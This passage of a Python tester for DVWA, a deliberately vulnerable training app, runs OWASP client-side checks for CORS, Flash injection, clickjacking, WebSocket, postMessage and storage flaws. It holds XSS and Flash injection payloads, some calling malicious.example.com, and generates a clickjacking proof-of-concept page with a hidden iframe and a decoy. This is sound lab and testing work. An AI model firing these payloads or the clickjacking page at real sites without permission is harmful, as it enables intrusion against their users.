            else:
                self.write_log(f"    [-] No obvious resource injection with payload '{payload}'{context}")


    def OTG_CLIENT_007(self):
        """Test Cross Origin Resource Sharing (CORS) vulnerabilities"""
        self.write_log("----- Starting OTG-CLIENT-007 (CORS Testing) -----")
        
        # Target endpoints to test (including API endpoints if known)
        test_endpoints = [
            f"{self.base_url}/vulnerabilities/cors/",
            f"{self.base_url}/vulnerabilities/xss_r/",  # Might have CORS headers
            f"{self.base_url}/vulnerabilities/sqli/",   # Might have CORS headers
            f"{self.base_url}/login.php",               # Sensitive endpoint
            f"{self.base_url}/api/"                     # Common API endpoint
        ]
        
        # Test cases for CORS
        test_cases = [
            {
                "name": "Wildcard Origin",
                "headers": {"Origin": "http://malicious.example.com"},
                "expected_vuln": lambda h: h.get("Access-Control-Allow-Origin") == "*"
            },
            {
                "name": "Reflected Origin",
                "headers": {"Origin": "http://reflect.example.com"},
                "expected_vuln": lambda h: "reflect.example.com" in h.get("Access-Control-Allow-Origin", "")
            },
            {
                "name": "Null Origin",
                "headers": {"Origin": "null"},
                "expected_vuln": lambda h: h.get("Access-Control-Allow-Origin") == "null"
            },
            {
                "name": "Credentials with Wildcard",
                "headers": {"Origin": "http://malicious.example.com"},
                "expected_vuln": lambda h: (
                    h.get("Access-Control-Allow-Origin") == "*" and 
                    h.get("Access-Control-Allow-Credentials", "").lower() == "true"
                )
            }
        ]
        
        # Preflight test cases
        preflight_test_cases = [
            {
                "method": "DELETE",
                "headers": {
                    "Access-Control-Request-Method": "DELETE",
                    "Origin": "http://malicious.example.com"
                }
            },
            {
                "method": "PUT",
                "headers": {
                    "Access-Control-Request-Method": "PUT",
                    "Origin": "http://malicious.example.com",
                    "Access-Control-Request-Headers": "x-custom-header"
                }
            }
        ]
        
        # Test each endpoint
        for endpoint in test_endpoints:
            self.write_log(f"\n[i] Testing endpoint: {endpoint}")
            
            # 1. Test simple GET requests with different Origin headers
            for test_case in test_cases:
                try:
                    self.write_log(f"  - Testing case: {test_case['name']}")
                    resp = self.session.get(
                        endpoint,
                        headers=test_case["headers"],
                        allow_redirects=False
                    )
                    
                    cors_headers = {
                        k.lower(): v for k, v in resp.headers.items() 
                        if k.lower().startswith('access-control-')
                    }
                    
                    if test_case["expected_vuln"](cors_headers):
                        self.write_log(
                            f"    [✓] Potential CORS misconfiguration found: {test_case['name']}\n"
                            f"        Headers: {cors_headers}"
                        )
                        print(f"[+] CORS vulnerability found: {test_case['name']}")
                    else:
                        self.write_log(f"    [-] No vulnerability detected for {test_case['name']}")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing {test_case['name']}: {str(e)}")
            
            # 2. Test preflight OPTIONS requests
            for test_case in preflight_test_cases:
                try:
                    self.write_log(f"  - Testing preflight for method: {test_case['method']}")
                    resp = self.session.options(
                        endpoint,
                        headers=test_case["headers"],
                        allow_redirects=False
                    )
                    
                    # Check if method is allowed
                    allowed_methods = resp.headers.get("Access-Control-Allow-Methods", "")
                    if test_case["method"] in allowed_methods:
                        self.write_log(
                            f"    [!] Potentially risky method allowed: {test_case['method']}\n"
                            f"        Allowed methods: {allowed_methods}\n"
                            f"        Headers: {dict(resp.headers)}"
                        )
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing preflight: {str(e)}")
            
            # 3. Test for XSS via CORS (if endpoint reflects input)
            if "?" in endpoint:
                xss_payload = "<script>alert('XSS via CORS')</script>"
                try:
                    parsed = urlparse(endpoint)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{parsed.query}&test={xss_payload}"
                    
                    resp = self.session.get(
                        test_url,
                        headers={"Origin": "http://malicious.example.com"},
                        allow_redirects=False
                    )
                    
                    if xss_payload in resp.text:
                        self.write_log(
                            f"    [✓] XSS injection possible via CORS-reflected input\n"
                            f"        URL: {test_url}"
                        )
                        print("[+] XSS injection possible via CORS-reflected input")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing XSS via CORS: {str(e)}")
        
        self.write_log("----- OTG-CLIENT-007 Test Completed -----\n")


    def OTG_CLIENT_008(self):
        """Test for Cross Site Flashing (XSF) vulnerabilities"""
        self.write_log("----- Starting OTG-CLIENT-008 (Cross Site Flashing) -----")
        
        # Common Flash endpoints to test
        flash_endpoints = [
            f"{self.base_url}/flash/",  # Common flash directory
            f"{self.base_url}/swf/",    # Alternative flash directory
            f"{self.base_url}/player.swf",
            f"{self.base_url}/main.swf",
            f"{self.base_url}/content/flashfile.swf"
        ]
        
        # Flash parameter injection payloads
        flash_payloads = [
            # JavaScript execution
            "javascript:alert(document.domain)",
            "asfunction:getURL,javascript:alert(document.domain)",
            "asfunction:alert,'XSS'",
            
            # External resource loading
            "http://malicious.example.com/evil.swf",
            "//malicious.example.com/evil.swf",
            
            # HTML injection
            "<a href='javascript:alert(1)'>click</a>",
            "<img src='javascript:alert(1)//.swf'>",
            
            # Open redirect
            "http://malicious.example.com/phish.html",
            "//malicious.example.com/phish.html",
            
            # ActionScript injection
            "asfunction:System.Security.allowDomain,malicious.example.com",
            "asfunction:_root.vulnerableFunction,arg"
        ]
        
        # Test each potential Flash endpoint
        for endpoint in flash_endpoints:
            self.write_log(f"\n[i] Testing Flash endpoint: {endpoint}")
            
            # 1. Check if SWF file exists
            try:
                resp = self.session.get(endpoint, allow_redirects=False)
                if resp.status_code != 200:
                    self.write_log(f"  - Endpoint not found (HTTP {resp.status_code})")
                    continue
                
                content_type = resp.headers.get('Content-Type', '').lower()
                if 'application/x-shockwave-flash' not in content_type:
                    self.write_log("  - Response is not a Flash file")
                    continue
                
                self.write_log("  - Found valid Flash file")
                
                # 2. Test for parameter injection vulnerabilities
                self.write_log("  - Testing for parameter injection vulnerabilities")
                
                # Common Flash parameters to test
                flash_params = [
                    "file", "url", "load", "path", "source",
                    "data", "config", "xml", "callback", "return"
                ]
                
                for param in flash_params:
                    for payload in flash_payloads:
                        try:
                            # Test GET parameter injection
                            test_url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                            resp = self.session.get(test_url, allow_redirects=False)
                            
                            # Check for reflected payload
                            if payload in resp.text:
                                self.write_log(
                                    f"    [✓] Possible XSF vulnerability found\n"
                                    f"        Parameter: {param}\n"
                                    f"        Payload: {payload}\n"
                                    f"        Payload reflected in response"
                                )
                                print(f"[+] Possible XSF vulnerability in parameter: {param}")
                            
                            # Check for redirects
                            if 300 <= resp.status_code < 400:
                                location = resp.headers.get('Location', '')
                                if payload in location:
                                    self.write_log(
                                        f"    [✓] Possible open redirect vulnerability\n"
                                        f"        Parameter: {param}\n"
                                        f"        Payload: {payload}\n"
                                        f"        Redirects to: {location}"
                                    )
                                    print(f"[+] Possible open redirect in parameter: {param}")
                            
                        except Exception as e:
                            self.write_log(f"    [x] Error testing {param}: {str(e)}")
                
                # 3. Check for FlashVars injection
                self.write_log("  - Testing FlashVars injection")
                flashvars_payload = "&".join([f"{p}={payload}" for p in flash_params for payload in flash_payloads[:3]])
                
                try:
                    test_url = f"{endpoint}?{flashvars_payload}"
                    resp = self.session.get(test_url, allow_redirects=False)
                    
                    # Check for interesting responses
                    if any(p in resp.text for p in flash_payloads[:3]):
                        self.write_log(
                            f"    [✓] Possible FlashVars injection\n"
                            f"        Payload: {flashvars_payload}\n"
                            f"        Payload reflected in response"
                        )
                        print("[+] Possible FlashVars injection vulnerability")
                
                except Exception as e:
                    self.write_log(f"    [x] Error testing FlashVars: {str(e)}")
                
                # 4. Check for ExternalInterface vulnerabilities
                self.write_log("  - Testing for ExternalInterface.call vulnerabilities")
                js_payloads = [
                    "alert(document.domain)",
                    "eval('alert(1)')",
                    "document.location='http://malicious.example.com'"
                ]
                
                for payload in js_payloads:
                    try:
                        test_url = f"{endpoint}?callback={urllib.parse.quote(payload)}"
                        resp = self.session.get(test_url, allow_redirects=False)
                        
                        if payload in resp.text:
                            self.write_log(
                                f"    [✓] Possible ExternalInterface.call injection\n"
                                f"        Payload: {payload}\n"
                                f"        Payload reflected in response"
                            )
                            print("[+] Possible ExternalInterface.call injection")
                    
                    except Exception as e:
                        self.write_log(f"    [x] Error testing ExternalInterface: {str(e)}")
            
            except Exception as e:
                self.write_log(f"  [x] Error testing endpoint {endpoint}: {str(e)}")
        
        # 5. Recommend decompilation for deeper analysis
        self.write_log("\n[i] For complete analysis, consider decompiling SWF files with tools like:")
        self.write_log("    - flare (ActionScript 2.0)")
        self.write_log("    - jpexs-decompiler")
        self.write_log("    - SWFScan (commercial)")
        self.write_log("    - ffdec (free)")
        
        self.write_log("----- OTG-CLIENT-008 Test Completed -----\n")


    def OTG_CLIENT_009(self):
        """Test for Clickjacking vulnerabilities"""
        self.write_log("----- Starting OTG-CLIENT-009 (Clickjacking) -----")
        
        # Test endpoints - focus on sensitive actions
        test_endpoints = [
            f"{self.base_url}/vulnerabilities/csrf/",
            f"{self.base_url}/account/transfer",
            f"{self.base_url}/profile/update",
            f"{self.base_url}/admin/actions",
            f"{self.base_url}/settings/change"
        ]
        
        import re
        # Check each endpoint for clickjacking protections
        for endpoint in test_endpoints:
            self.write_log(f"\n[i] Testing endpoint: {endpoint}")
            
            try:
                # 1. Check for X-Frame-Options header
                resp = self.session.get(endpoint, allow_redirects=False)
                x_frame_options = resp.headers.get('X-Frame-Options', '').upper()
                
                if not x_frame_options:
                    self.write_log(
                        "  [✓] Missing X-Frame-Options header - vulnerable to clickjacking\n"
                        "      Recommendation: Add X-Frame-Options: DENY or Content-Security-Policy: frame-ancestors 'none'"
                    )
                    print(f"[+] Clickjacking vulnerability found at {endpoint} (missing X-Frame-Options)")
                elif x_frame_options in ['DENY', 'SAMEORIGIN']:
                    self.write_log(f"  [-] Protected by X-Frame-Options: {x_frame_options}")
                elif 'ALLOW-FROM' in x_frame_options:
                    self.write_log(
                        f"  [!] Limited protection with X-Frame-Options: {x_frame_options}\n"
                        "      ALLOW-FROM is deprecated and not widely supported"
                    )
                else:
                    self.write_log(f"  [!] Unrecognized X-Frame-Options value: {x_frame_options}")
                
                # 2. Check for Content-Security-Policy frame-ancestors
                csp = resp.headers.get('Content-Security-Policy', '')
                if 'frame-ancestors' in csp.lower():
                    self.write_log(f"  [-] Protected by CSP frame-ancestors directive")
                elif not x_frame_options:
                    self.write_log(
                        "  [✓] Missing frame-ancestors in CSP - vulnerable to clickjacking\n"
                        "      Recommendation: Add Content-Security-Policy: frame-ancestors 'none'"
                    )
                
                # 3. Test frame busting JavaScript
                if not x_frame_options and 'frame-ancestors' not in csp.lower():
                    self.write_log("  [*] Checking for frame busting JavaScript")
                    
                    # Check for common frame busting patterns
                    frame_busting_patterns = [
                        r'top\.location\s*=\s*self\.location',
                        r'parent\.location\.href\s*=\s*self\.location',
                        r'window\.top\.location\s*=\s*window\.self\.location',
                        r'if\s*\(top\s*!=\s*self\)',
                        r'if\s*\(window\.top\s*!=\s*window\.self\)'
                    ]
                    
                    found_busting = False
                    for pattern in frame_busting_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            found_busting = True
                            self.write_log(f"    - Found potential frame busting code: {pattern}")
                            break
                    
                    if not found_busting:
                        self.write_log(
                            "    [✓] No frame busting JavaScript detected - vulnerable to clickjacking\n"
                            "        Recommendation: Implement frame busting JavaScript or use X-Frame-Options/CSP"
                        )
                        print(f"[+] Clickjacking vulnerability found at {endpoint} (no frame busting)")
                    else:
                        # Test bypass techniques for frame busting
                        self.write_log("    [*] Testing frame busting bypass techniques")
                        
                        # Test double framing
                        self.write_log("      - Testing double framing bypass")
                        double_frame_html = f"""
                        <html>
                            <head><title>Double Frame Test</title></head>
                            <body>
                                <iframe src="data:text/html;charset=utf-8,<iframe src='{endpoint}'></iframe>">
                                </iframe>
                            </body>
                        </html>
                        """
                        with open("double_frame_test.html", "w") as f:
                            f.write(double_frame_html)
                        self.write_log("        Created double_frame_test.html for manual verification")
                        
                        # Test onBeforeUnload bypass
                        self.write_log("      - Testing onBeforeUnload bypass")
                        before_unload_html = f"""
                        <html>
                            <head><title>onBeforeUnload Test</title></head>
                            <body>
                                <script>
                                    window.onbeforeunload = function() {{
                                        return "Leave page?";
                                    }};
                                </script>
                                <iframe src="{endpoint}"></iframe>
                            </body>
                        </html>
                        """
                        with open("before_unload_test.html", "w") as f:
                            f.write(before_unload_html)
                        self.write_log("        Created before_unload_test.html for manual verification")
                
                # 4. Create proof-of-concept HTML if vulnerable
                if not x_frame_options and 'frame-ancestors' not in csp.lower():
                    poc_html = f"""
                    <html>
                        <head>
                            <title>Clickjacking PoC</title>
                            <style>
                                #target {{
                                    position:absolute;
                                    top:0;
                                    left:0;
                                    width:100%;
                                    height:100%;
                                    opacity:0.0001;
                                    z-index:2;
                                }}
                                #decoy {{
                                    position:absolute;
                                    top:50px;
                                    left:60px;
                                    width:120px;
                                    height:60px;
                                    z-index:1;
                                }}
                            </style>
                        </head>
                        <body>
                            <div id="decoy">Click here for free stuff!</div>
                            <iframe id="target" src="{endpoint}"></iframe>
                        </body>
                    </html>
                    """
                    poc_filename = f"clickjacking_poc_{endpoint.split('/')[-1]}.html"
                    with open(poc_filename, "w") as f:
                        f.write(poc_html)
                    self.write_log(f"  [*] Created clickjacking PoC: {poc_filename}")
                    
            except Exception as e:
                self.write_log(f"  [x] Error testing {endpoint}: {str(e)}")
        
        self.write_log("\n[i] Manual verification steps:")
        self.write_log("    1. Open generated HTML test files in browser")
        self.write_log("    2. Check if target page loads in frame despite protections")
        self.write_log("    3. Verify if UI elements can be overlayed/clickjacked")
        self.write_log("----- OTG-CLIENT-009 Test Completed -----\n")


    def OTG_CLIENT_010(self):
        """Test for WebSocket security vulnerabilities"""
        self.write_log("----- Starting OTG-CLIENT-010 (WebSocket Testing) -----")
        
        # Common WebSocket endpoints to test (can be extended)
        ws_endpoints = [
            f"{self.base_url.replace('http', 'ws')}/ws",
            f"{self.base_url.replace('http', 'ws')}/websocket",
            f"{self.base_url.replace('http', 'ws')}/socket",
            f"{self.base_url.replace('http', 'ws')}/wss",
            f"{self.base_url.replace('http', 'ws')}/live-updates"
        ]
        
        # Test cases
        test_cases = [
            {
                "name": "Origin Header Validation",
                "payload": {"Origin": "http://malicious.com"},
                "check": lambda r: "Origin validation failed" not in str(r)
            },
            {
                "name": "Cross-Protocol WebSocket Hijacking",
                "payload": {"Connection": "Upgrade", "Upgrade": "websocket"},
                "check": lambda r: "HTTP/1.1 101 Switching Protocols" in str(r)
            },
            {
                "name": "Insecure WS Protocol",
                "payload": {},
                "check": lambda r: "wss://" not in str(r)
            }
        ]
        
        try:
            import websocket
            from websocket import create_connection, WebSocketTimeoutException
        except ImportError:
            self.write_log("[-] websocket-client module not installed. Install with: pip install websocket-client")
            print("[-] websocket-client module required for WebSocket testing")
            return
        
        for endpoint in ws_endpoints:
            self.write_log(f"\n[i] Testing WebSocket endpoint: {endpoint}")
            
            # Test 1: Basic WebSocket connection
            try:
                ws = create_connection(endpoint, timeout=5)
                self.write_log(f"[+] WebSocket connection established to {endpoint}")
                
                # Test message sending
                test_message = "TEST_MESSAGE_123"
                ws.send(test_message)
                result = ws.recv()
                
                if test_message in result:
                    self.write_log("[✓] Echo test successful - server reflects messages")
                else:
                    self.write_log("[!] Server responded but didn't echo test message")
                
                ws.close()
            except WebSocketTimeoutException:
                self.write_log("[-] WebSocket connection timeout")
            except Exception as e:
                self.write_log(f"[-] WebSocket connection failed: {str(e)}")
            
            # Test 2: Security headers and origin validation
            try:
                headers = {
                    "Origin": "http://attacker.com",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                }
                ws = create_connection(endpoint, header=headers, timeout=5)
                self.write_log("[!] WebSocket accepted connection from arbitrary origin (potential CSRF)")
                ws.close()
            except Exception as e:
                self.write_log("[+] WebSocket rejected connection with invalid origin")
            
            # Test 3: Input sanitization test
            try:
                ws = create_connection(endpoint, timeout=5)
                xss_payload = "<script>alert('XSS')</script>"
                ws.send(xss_payload)
                result = ws.recv()
                
                if xss_payload in result:
                    self.write_log("[!] XSS payload reflected without sanitization")
                else:
                    self.write_log("[+] Input appears to be sanitized")
                
                ws.close()
            except Exception as e:
                self.write_log(f"[-] Input sanitization test failed: {str(e)}")
        
        # Additional manual testing notes
        self.write_log("\n[i] Manual testing recommendations:")
        self.write_log("  - Use browser developer tools to inspect WebSocket traffic")
        self.write_log("  - Test with ZAP's WebSocket tab for advanced manipulation")
        self.write_log("  - Verify wss:// is used for sensitive data transport")
        
        self.write_log("----- OTG-CLIENT-010 Test Completed -----\n")


    def OTG_CLIENT_011(self):
        """Test for Web Messaging (postMessage) security vulnerabilities"""
        self.write_log("----- Starting OTG-CLIENT-011 (Web Messaging Testing) -----")
        
        # List of pages to test for postMessage implementations
        test_pages = [
            f"{self.base_url}/vulnerabilities/web_messaging/",
            f"{self.base_url}/includes/web_messaging.js",
            f"{self.base_url}/js/messaging.js"
        ]
        
        # Test cases for origin validation
        origin_test_cases = [
            {"origin": "http://malicious.com", "expected": False},
            {"origin": "http://attacker.org", "expected": False},
            {"origin": self.base_url, "expected": True},
            {"origin": self.base_url.replace("http", "https"), "expected": False},
            {"origin": f"{self.base_url}:8080", "expected": False},
            {"origin": f"{self.base_url}.attacker.com", "expected": False}
        ]
        
        # Test cases for input handling
        input_test_cases = [
            {"payload": "<script>alert('XSS')</script>", "vulnerable": False},
            {"payload": "legit_message", "vulnerable": False},
            {"payload": "<img src=x onerror=alert(1)>", "vulnerable": False},
            {"payload": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "vulnerable": False}
        ]
        
        try:
            # First check if the page has any message event listeners
            for page in test_pages:
                self.write_log(f"\n[i] Testing page: {page}")
                
                resp = self.session.get(page)
                if resp.status_code != 200:
                    self.write_log(f"[-] Page not found: {page}")
                    continue
                
                # Check for message event listeners
                if "addEventListener(\"message\"" in resp.text or "window.onmessage" in resp.text:
                    self.write_log("[+] Found message event listener(s)")
                    
                    # Analyze origin validation
                    origin_validation = {
                        "strict": False,
                        "wildcard": False,
                        "none": False
                    }
                    
                    if "event.origin" in resp.text or "e.origin" in resp.text:
                        if ".indexOf(" in resp.text or ".includes(" in resp.text:
                            origin_validation["wildcard"] = True
                            self.write_log("[!] Wildcard origin validation detected (potentially insecure)")
                        elif "===" in resp.text or "==" in resp.text:
                            origin_validation["strict"] = True
                            self.write_log("[+] Strict origin validation detected")
                    else:
                        origin_validation["none"] = True
                        self.write_log("[!] No origin validation detected (insecure)")
                    
                    # Analyze input handling
                    dangerous_methods = {
                        "innerHTML": False,
                        "outerHTML": False,
                        "eval": False,
                        "Function": False,
                        "document.write": False
                    }
                    
                    for method in dangerous_methods:
                        if method in resp.text:
                            dangerous_methods[method] = True
                            self.write_log(f"[!] Potentially dangerous method detected: {method}")
                    
                    # Test origin validation (simulated)
                    self.write_log("\n[i] Simulating origin validation tests:")
                    for test in origin_test_cases:
                        if origin_validation["none"]:
                            result = True
                        elif origin_validation["wildcard"]:
                            result = test["origin"] in self.base_url or test["origin"] in self.base_url.replace("http", "https")
                        else:  # strict
                            result = test["origin"] == self.base_url
                        
                        if result == test["expected"]:
                            self.write_log(f"  [+] Origin {test['origin']} handled {'correctly' if test['expected'] else 'securely'}")
                        else:
                            self.write_log(f"  [!] Origin {test['origin']} handled {'incorrectly' if test['expected'] else 'insecurely'}")
                    
                    # Test input handling (simulated)
                    self.write_log("\n[i] Simulating input handling tests:")
                    for test in input_test_cases:
                        if any(dangerous_methods.values()):
                            self.write_log(f"  [!] Input '{test['payload'][:20]}...' might be processed dangerously")
                        else:
                            self.write_log(f"  [+] Input '{test['payload'][:20]}...' likely handled safely")
                    
                    # Manual testing recommendations
                    self.write_log("\n[i] Manual testing recommendations:")
                    self.write_log("  - Use browser console to test actual postMessage() behavior")
                    self.write_log("  - Check for DOM XSS when messages are processed")
                    self.write_log("  - Verify no sensitive data is exposed via messages")
                    
                else:
                    self.write_log("[-] No message event listeners found")
        
        except Exception as e:
            self.write_log(f"[-] Error during web messaging tests: {str(e)}")
        
        self.write_log("----- OTG-CLIENT-011 Test Completed -----\n")


    def OTG_CLIENT_012(self):
        """Test for client-side storage security vulnerabilities"""
        self.write_log("----- Starting OTG-CLIENT-012 (Client-Side Storage Testing) -----")
        
        # List of pages to test for client-side storage usage
        test_pages = [
            f"{self.base_url}/vulnerabilities/client_storage/",
            f"{self.base_url}/includes/storage.js",
            f"{self.base_url}/js/app.js"
        ]
        
        # Sensitive data patterns to look for
        sensitive_patterns = [
            r"token", r"secret", r"password", r"api_key", 
            r"credit_card", r"ssn", r"session", r"auth",
            r"private", r"jwt", r"oauth"
        ]
        
        # Dangerous storage methods
        dangerous_methods = {
            "localStorage": ["setItem", "getItem", "removeItem"],
            "sessionStorage": ["setItem", "getItem", "removeItem"],
            "indexedDB": ["open", "transaction", "put", "add"],
            "cookie": ["document.cookie"]
        }
        
        try:
            for page in test_pages:
                self.write_log(f"\n[i] Testing page: {page}")
                
                resp = self.session.get(page)
                if resp.status_code != 200:
                    self.write_log(f"[-] Page not found: {page}")
                    continue
                
                content = resp.text
                
                # Check for storage mechanisms in use
                storage_found = False
                
                # Test Local Storage
                if "localStorage" in content:
                    storage_found = True
                    self.write_log("[+] localStorage usage detected")
                    self._analyze_storage_usage(content, "localStorage", sensitive_patterns)
                
                # Test Session Storage
                if "sessionStorage" in content:
                    storage_found = True
                    self.write_log("[+] sessionStorage usage detected")
                    self._analyze_storage_usage(content, "sessionStorage", sensitive_patterns)
                
                # Test IndexedDB
                if "indexedDB" in content:
                    storage_found = True
                    self.write_log("[+] indexedDB usage detected")
                    self._analyze_storage_usage(content, "indexedDB", sensitive_patterns)
                
                # Test Cookies
                if "document.cookie" in content and ("=" in content.split("document.cookie")[1][:20]):
                    storage_found = True
                    self.write_log("[+] Direct cookie manipulation detected")
                    self._analyze_storage_usage(content, "cookie", sensitive_patterns)
                
                # Test Window Object
                if "window." in content and ("=" in content.split("window.")[1][:20]):
                    storage_found = True
                    self.write_log("[+] Window object property assignment detected")
                    self._analyze_storage_usage(content, "window", sensitive_patterns)
                
                if not storage_found:
                    self.write_log("[-] No client-side storage mechanisms detected")
                
                # Check for dangerous patterns
                self._check_dangerous_patterns(content, dangerous_methods)
        
        except Exception as e:
            self.write_log(f"[-] Error during client-side storage tests: {str(e)}")
        
        # Manual testing recommendations
        self.write_log("\n[i] Manual testing recommendations:")
        self.write_log("  - Use browser DevTools to inspect actual storage contents")
        self.write_log("  - Check for sensitive data in localStorage/sessionStorage")
        self.write_log("  - Verify IndexedDB for extractable CryptoKeys")
        self.write_log("  - Test for XSS via storage injection vectors")
        
        self.write_log("----- OTG-CLIENT-012 Test Completed -----\n")
    
    def _analyze_storage_usage(self, content, storage_type, sensitive_patterns):
        """Helper method to analyze storage usage patterns"""
        import re
        # Check for sensitive data patterns
        sensitive_found = False
        for pattern in sensitive_patterns:
            if re.search(f"{storage_type}\..*{pattern}", content, re.IGNORECASE):
                self.write_log(f"[!] Potential sensitive data in {storage_type}: {pattern}")
                sensitive_found = True
        
        if not sensitive_found:
            self.write_log(f"[+] No obvious sensitive data patterns in {storage_type}")
        
        # Check for proper data serialization
        if storage_type in ["localStorage", "sessionStorage"]:
            if "JSON.stringify" in content and "JSON.parse" in content:
                self.write_log(f"[+] Proper serialization detected in {storage_type}")
            else:
                self.write_log(f"[!] Missing JSON serialization in {storage_type} usage")
        
        # Check for tainted data usage
        dangerous_sinks = ["innerHTML", "outerHTML", "eval", "document.write"]
        for sink in dangerous_sinks:
            if f"{storage_type}" in content and sink in content:
                parts = content.split(f"{storage_type}")
                for part in parts[1:3]:  # Check next few parts after storage reference
                    if sink in part:
                        self.write_log(f"[!] Potential XSS vector: {storage_type} -> {sink}")
    
    def _check_dangerous_patterns(self, content, dangerous_methods):
        """Helper method to check for dangerous storage patterns"""
        for storage_type, methods in dangerous_methods.items():
            for method in methods:
                pattern = f"{storage_type}.{method}"
                if pattern in content:
                    # Check if user input reaches storage
                    user_input_indicators = [
                        "location.", "document.URL", "document.documentURI", 
                        "location.href", "location.search", "location.hash",
                        "window.name", "document.referrer"
                    ]
                    
                    for indicator in user_input_indicators:
                        if indicator in content and pattern in content:
                            parts = content.split(indicator)
                            for part in parts[1:3]:  # Check next few parts after input
                                if pattern in part:
                                    self.write_log(f"[!] Potential injection: {indicator} -> {pattern}")

def main():
    parser = argparse.ArgumentParser(description='DVWA Client-Side Security Tester')
    parser.add_argument('--url', default='http://localhost:8080', help='DVWA base URL')
    parser.add_argument('--username', default='admin', help='DVWA username')
    parser.add_argument('--password', default='password', help='DVWA password')
    parser.add_argument('--tests', nargs='+', 
                       choices=['ALL', 'OTG_CLIENT_001', 'OTG_CLIENT_002', 
                               'OTG_CLIENT_003', 'OTG_CLIENT_004', 'OTG_CLIENT_005',
                               'OTG_CLIENT_006', 'OTG_CLIENT_007', 'OTG_CLIENT_008',
                               'OTG_CLIENT_009', 'OTG_CLIENT_010', 'OTG_CLIENT_011',
                               'OTG_CLIENT_012'],
                       default=['ALL'],
                       help='Tests to run (default: ALL)')
    args = parser.parse_args()
    
    tester = DVWAClientTester(base_url=args.url, username=args.username, password=args.password)
    
    if not tester.login():
        print("[-] Login failed. Exiting.")
        return
    
    # Determine which tests to run
    if 'ALL' in args.tests:
        tests_to_run = [f'OTG_CLIENT_{i:03d}' for i in range(1, 13)]
    else:
        tests_to_run = args.tests
    
    # Run the tests
    test_functions = {
        'OTG_CLIENT_001': tester.OTG_CLIENT_001,
        'OTG_CLIENT_002': tester.OTG_CLIENT_002,
        'OTG_CLIENT_003': tester.OTG_CLIENT_003,
        'OTG_CLIENT_004': tester.OTG_CLIENT_004,
        'OTG_CLIENT_005': tester.OTG_CLIENT_005,
        'OTG_CLIENT_006': tester.OTG_CLIENT_006,
        'OTG_CLIENT_007': tester.OTG_CLIENT_007,
        'OTG_CLIENT_008': tester.OTG_CLIENT_008,
        'OTG_CLIENT_009': tester.OTG_CLIENT_009,
        'OTG_CLIENT_010': tester.OTG_CLIENT_010,
        'OTG_CLIENT_011': tester.OTG_CLIENT_011,
        'OTG_CLIENT_012': tester.OTG_CLIENT_012,
    }
    
    for test in tests_to_run:
        if test in test_functions:
            print(f"\n[+] Running {test}...")
            test_functions[test]()
        else:
            print(f"[!] Test not implemented yet: {test}")

if __name__ == "__main__":
    main()